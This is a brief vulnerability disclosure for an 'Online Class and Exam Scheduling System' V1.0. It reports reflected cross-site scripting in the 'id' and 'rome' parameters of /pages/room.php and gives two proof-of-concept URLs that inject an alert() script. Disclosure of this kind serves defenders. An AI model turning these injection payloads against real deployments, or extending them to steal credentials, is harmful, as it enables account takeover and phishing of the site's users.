# NAME OF AFFECTED PRODUCT(S)

Online Class and Exam Scheduling System

# VERSION(S)

V1.0

# submitter

lvzhouhang

# Vulnerable File

/pages/room.php

Prerequisite: You need to log in first

# Software Link

https://download.code-projects.org/details/93487762-3e23-48ab-a56f-af5e61441ee1

# Vulnerability Type

Cross Site Scripting

in /pages/room.php   `id` and  `rome` Parameters have Cross Site Scripting(XSS)

A malicious attacker can use this vulnerability to obtain administrator login credentials or phishing websites

# POC

~~~
pages/room.php?id="><script>alert(1)</script><c"
~~~

~~~
pages/room.php?rome="><script>alert(1)</script><c"
~~~

